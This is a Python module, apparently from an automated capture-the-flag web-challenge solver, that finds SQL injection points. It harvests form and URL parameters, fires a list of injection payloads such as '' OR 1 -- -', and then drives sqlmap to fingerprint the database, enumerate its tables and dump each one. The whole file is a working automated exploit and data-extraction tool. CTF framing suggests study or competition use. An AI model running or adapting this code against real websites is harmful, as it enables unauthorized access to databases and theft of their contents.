try:
    import re
    import subprocess
    import web_solver.util as util
    import web_solver.web as web
    import requests
    import urllib.parse
except Exception as e:
    raise ImportError("sql_injection.py -> " + str(e))


class PossibleEndpoint:
    def __init__(self, url, method, parameters):
        self.url = url
        self.method = method
        self.parameters = parameters  # (name)


def retrieve_all_possible_endpoint(all_request):
    all_possible_endpoint = list()
    for request in all_request:
        for form in request.forms:
            parameters = list()
            for parameter in form.parameters:
                # parameter[1].lower() != "submit" and
                if parameter[0] is not None and len(parameter[0]) != 0:
                    parameters.append(parameter[0])
            if len(parameters) != 0:
                all_possible_endpoint.append(PossibleEndpoint(form.url, form.method.upper(), parameters))

        get_parameters = util.get_get_parameters_from_url(request.url_after_potential_redirection)
        if get_parameters is not None and len(get_parameters) != 0:
            all_possible_endpoint.append(PossibleEndpoint(
                util.remove_all_get_parameters_in_url(request.url_after_potential_redirection), "GET", get_parameters))

    return all_possible_endpoint


def use_sql_map(all_request, threads):
    web.CHALLENGE.log("searching for SQL injection", state=2, no_verbose_output="searching for SQL injection")
    all_possible_endpoint = unique_possible_endpoint(retrieve_all_possible_endpoint(all_request))

    for possibleEndpoint in all_possible_endpoint:
        parameters = create_payload(possibleEndpoint.parameters, "1")
        if parameters != "":
            trying_manual_injection(possibleEndpoint.url, possibleEndpoint.method, possibleEndpoint.parameters)

            command = "sqlmap --batch --random-agent --threads=" + str(threads) + " -u "
            if possibleEndpoint.method == "GET":
                command += possibleEndpoint.url + "?" + parameters
                exec_sql_map_commands(command)

            elif possibleEndpoint.method == "POST":
                command += possibleEndpoint.url + " --data=\"" + parameters + "\" "
                exec_sql_map_commands(command)


def exec_sql_map_commands(command):
    output = capture_output(command)
    database_type = re.findall(r"back-end DBMS: ([^\n]*)", str(output))
    if database_type:
        web.CHALLENGE.log("found database type : " + str(database_type), state=0)
        command2 = command + " --dbms=" + database_type[0] + " --tables"
        output = capture_output(command2)
        database_name = re.findall(r"Database: ([^\n]*)", str(output), re.I)
        database_tables = re.findall(r"\+-*\+\n\| ([^+]*)", str(output))
        if database_tables is not None:
            database_tables = database_tables[0].split(" |\n| ")
            database_tables[-1] = database_tables[-1][:-3]
            web.CHALLENGE.log("found database tables : " + str(database_tables), state=0)
            for t in database_tables:
                command3 = command + " --dbms=" + database_type[0] + " -T " + t + " --dump"
                if database_name is not None:
                    command3 += " -D " + database_name[0]
                capture_output(command3)


def unique_possible_endpoint(all_possible_endpoint):
    res = list()
    for e in all_possible_endpoint:
        already_test = False
        for r in res:
            if e.method == r.method and e.url == r.url and set(e.parameters).issubset(r.parameters):
                already_test = True
                break
        if not already_test:
            res.append(e)
    return res


def capture_output(command):
    web.CHALLENGE.log(command, verbose=web.VERBOSE, state=2)
    subprocess.run(command, capture_output=not web.VERBOSE, shell=True)
    completed_process = subprocess.run(command + " --offline", capture_output=True, text=True, shell=True)
    output = str(completed_process.stdout + completed_process.stderr)
    if "unable to continue in offline mode because of lack of usable session data" in output:
        web.CHALLENGE.log("Nothing found with SQLMap", verbose=web.VERBOSE, state=2)
    else:
        web.CHALLENGE.log("```\n[*" + re.sub(r"^.*?\*", "", output, flags=re.S) + "```\n", verbose=False, clean=True)
        web.TO_ANALYZE += output
    return output


def levenshtein_distance(first, second):
    """Find the Levenshtein distance between two strings."""
    if len(first) > len(second):
        first, second = second, first
    if len(second) == 0:
        return len(first)
    first_length = len(first) + 1
    second_length = len(second) + 1
    distance_matrix = [[0] * second_length for x in range(first_length)]
    for i in range(first_length):
        distance_matrix[i][0] = i
    for j in range(second_length):
        distance_matrix[0][j] = j
    for i in range(1, first_length):
        for j in range(1, second_length):
            deletion = distance_matrix[i-1][j] + 1
            insertion = distance_matrix[i][j-1] + 1
            substitution = distance_matrix[i-1][j-1]
            if first[i-1] != second[j-1]:
                substitution += 1
            distance_matrix[i][j] = min(insertion, deletion, substitution)
    return distance_matrix[first_length-1][second_length-1]


def percent_diff(first, second):
    return 100*levenshtein_distance(first, second) / float(max(len(first), len(second)))


COMMON_INJECTION = [
    "' or \"",
    "' OR 1 -- -",
    "\" OR \"\" = \"",
    "admin\" and 1 -- -"
]


def trying_manual_injection(url, method, parameters):
    original_response = ""
    original_payload = create_payload(parameters, "1")
    if method == "GET":
        original_response = requests.get(url + "?" + original_payload)
    if method == "POST":
        original_response = requests.post(url, data=original_payload)

    for injection in COMMON_INJECTION:
        response = ""
        payload = create_payload(parameters, urllib.parse.quote(injection, safe=""))

        if method == "GET":
            web.CHALLENGE.log("Testing manual sql injection on : " + url + "?" + payload, verbose=web.VERBOSE, state=2)
            response = requests.get(url + "?" + payload)
        if method == "POST":
            web.CHALLENGE.log("Testing manual sql injection on : " + url + "  with POST parameters : " + payload,
                              verbose=web.VERBOSE, state=2)
            response = requests.post(url, data=payload, headers={"Content-Type": "application/x-www-form-urlencoded"})
        diff = percent_diff(original_response.text, response.text)
        if diff >= 50.0:
            web.CHALLENGE.log("Seems to be a sql injection here : " + url + " with method " + method,
                              verbose=True, state=0)
            web.TO_ANALYZE += response.text
            break


def create_payload(parameters, parameters_value):
    payload = ""
    for p in parameters:
        if p is not None and len(p) != 0:
            payload += p + "=" + parameters_value + "&"
    return payload
